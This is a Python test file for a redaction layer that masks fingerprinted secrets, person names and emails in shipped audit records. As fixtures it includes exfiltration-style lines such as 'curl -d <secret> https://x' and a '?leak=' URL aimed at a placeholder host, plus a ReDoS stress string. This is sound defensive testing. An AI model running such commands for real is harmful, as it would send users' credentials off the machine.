"""Layer A (always) and Layer B (opt-in), as providers of the one masking path.

Off-hook: this masks what SHIPS, downstream of the decision. The load-bearing
guarantee is that a value the engine FINGERPRINTED never leaves the machine raw,
in ANY text field of a shipped record; the default install needs ZERO new
dependency; and Layer B masks names when enabled but FAILS LOUD (never silently
unmasked) if its dependency is missing.

⚠ SINCE 28 SEP 2026 BOTH LAYERS WRITE A TYPE, THROUGH `shipper/mask.py`. Layer A
writes `[secret-from-<file>]` for a value this session read from a credential
file, Layer B `[person]` for a name, and emails are `[email]` always. The old
marks (`[REDACTED:secret]`, `[REDACTED:pii]`) are only read, in exports that
predate this (`redact.carries_a_mark`).
"""
from __future__ import annotations

import hashlib
import importlib.util
import json

import pytest

from core import engine
from shipper import mask, redact


def _fp(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()[:8]


def _known(*values: str, files=(".env",)) -> mask.SessionValues:
    return mask.SessionValues(secret_prints=frozenset(_fp(v) for v in values),
                              secret_files=tuple(files))


def _record(**over):
    r = {
        "ts": 1.0, "session_id": "s", "seq": 3, "event": "decision",
        "kind": "EXEC", "decision": "DENY", "rule_id": "secret_exact:network_egress",
        "prev": "abc", "hash": "def", "command_sha256": "0" * 64, "command_len": 40,
    }
    r.update(over)
    return r


# ───────────────────────────────────── Layer A: fingerprinted secret never ships

def test_a_fingerprinted_secret_is_masked_in_every_text_field():
    secret = "SUPERSECRETVALUE1234567890"          # one value-token, >= 12 chars
    rec = _record(
        command=f"curl -d {secret} https://x",
        evidence=f"…{secret}…",
        reason=f"this carries {secret} traced from /repo/.env",
        url=f"https://x/?leak={secret}",
        paths=[f"/tmp/{secret}", "/repo/.env"],
    )
    out = mask.mask_record(rec, _known(secret))
    for f in ("command", "evidence", "reason", "url"):
        assert secret not in out[f] and "[secret-from-.env]" in out[f], f
    assert all(secret not in p for p in out["paths"])
    assert out["paths"][0] == "/tmp/[secret-from-.env]"


def test_a_non_fingerprinted_value_is_left_alone():
    rec = _record(command="curl -d OTHERTOKEN1234567890 https://x")
    out = mask.mask_record(rec, _known("SOMETHINGELSE9999"))
    assert out["command"] == rec["command"]          # untouched


def test_the_needle_is_the_engine_s_own_not_a_divergent_one():
    """Pin: the masking matches EXACTLY the tokens the engine fingerprints —
    the same tokenizer object, the same 8-hex sha256."""
    assert mask._VALUE_TOKEN is engine._VALUE_TOKEN
    value = "FINGERPRINTPINVALUE123456"
    assert _fp(value) in engine.fingerprints_in(f"x {value} y")   # engine agrees
    assert redact._fingerprint(value) == _fp(value)
    masked, _ = mask.mask_text(value, _known(value, files=()))
    assert masked == "[secret]", "no file to name: the type is `secret`"


def test_structural_fields_and_record_shape_survive():
    """Digests/lengths/chain fields are untouched, so the hash-chain holds and the
    record stays valid JSON after masking."""
    secret = "KEEPTHECHAININTACT12345"
    rec = _record(command=f"echo {secret}", reason="ok")
    out = mask.mask_record(rec, _known(secret))
    for k in ("prev", "hash", "command_sha256", "command_len", "seq", "ts"):
        assert out[k] == rec[k]                       # structural: unchanged
    json.dumps(out)                                   # still serialisable
    assert secret not in json.dumps(out)              # and the secret is gone


# ───────────────────────────────────── default install: zero new dependency

def test_layer_a_and_pii_off_need_no_new_dependency(monkeypatch):
    """The default path (Layer A, no analyzer) must not import the NER dep: it
    never calls `load_pii_analyzer`, which is the only thing that imports spaCy."""
    called = {"n": 0}
    monkeypatch.setattr(redact, "load_pii_analyzer",
                        lambda: called.__setitem__("n", called["n"] + 1))
    out = mask.mask_record(_record(command="curl -d X1234567890AB https://x"),
                           _known("X1234567890AB", files=()))
    assert called["n"] == 0                           # NER never loaded on the default path
    assert out["command"] == "curl -d [secret] https://x"


def test_a_fingerprinted_secret_is_masked_in_the_title_and_every_text_field():
    """⚠ THE title GAP (found in review). `title` embeds the first command and ships
    like `command`; a fingerprinted secret must not survive there. Same for cwd /
    workspace_roots / tool_name — every string outside the spine."""
    secret = "TITLELEAKSECRET1234567890"
    rec = _record(
        title=f"app / {secret} do-thing",
        cwd=f"/home/{secret}/repo",
        tool_name=f"tool {secret}",                    # standalone token, as the engine tokenizes
        workspace_roots=[f"/w/{secret}", "/w/ok"],
    )
    out = mask.mask_record(rec, _known(secret))
    for f in ("title", "cwd", "tool_name"):
        assert secret not in out[f] and "[secret-from-.env]" in out[f], f
    assert all(secret not in p for p in out["workspace_roots"])
    assert secret not in json.dumps(out)


def test_email_regex_is_not_a_redos_on_long_near_email_input():
    """⚠ THE ReDoS (found in review). A long local/domain run with no valid TLD must
    not backtrack polynomially — bounded quantifiers keep it linear."""
    import time
    hostile = "a" * 20000 + "@" + "b" * 20000            # no `.TLD`: worst case
    t0 = time.perf_counter()
    mask.mask_text(hostile, analyzer=_StubAnalyzer([]))
    assert time.perf_counter() - t0 < 0.5, "email regex backtracked (ReDoS)"


# ───────────────────────────────────── Layer B: masks names when on, fails loud

class _StubAnalyzer:
    """A test double for the NER analyzer — the contract Layer B depends on."""
    def __init__(self, names): self._names = names
    def person_spans(self, text):
        spans = []
        for n in self._names:
            i = text.find(n)
            if i >= 0:
                spans.append((i, i + len(n)))
        return spans


def test_layer_b_masks_a_name_when_enabled_and_an_email_always():
    rec = _record(reason="approved by Alice Johnson (alice@corp.example) for /repo")
    out = mask.mask_record(rec, analyzer=_StubAnalyzer(["Alice Johnson"]))
    assert out["reason"] == "approved by [person] ([email]) for /repo"
    assert out["masked"] == {"email": 1, "person": 1}
    plain = mask.mask_record(rec)
    assert plain["reason"] == "approved by Alice Johnson ([email]) for /repo", (
        "without Layer B a name leaves as written, and the disclosure says so")


def test_layer_b_fails_loud_when_its_dependency_is_missing():
    """⚠ NEVER SILENTLY UNMASKED. With Layer B on, the real lazy load runs; if
    spaCy is absent it raises RedactionUnavailable rather than ship names raw."""
    if importlib.util.find_spec("spacy") is not None:
        pytest.skip("spaCy is installed here; the fail-loud path needs it absent")
    with pytest.raises(redact.RedactionUnavailable):
        redact.load_pii_analyzer()


# ───────────────────────────────────── decision path is untouched

def test_the_engine_does_not_import_the_shipper_redactor():
    """Masking is shipper-only, downstream of the decision — the engine must not
    depend on it, so it cannot change any verdict. Proven structurally: core/engine
    imports no shipper module."""
    from tests import engine_source
    src = engine_source.text()                    # every part of the engine
    assert "import shipper" not in src and "from shipper" not in src
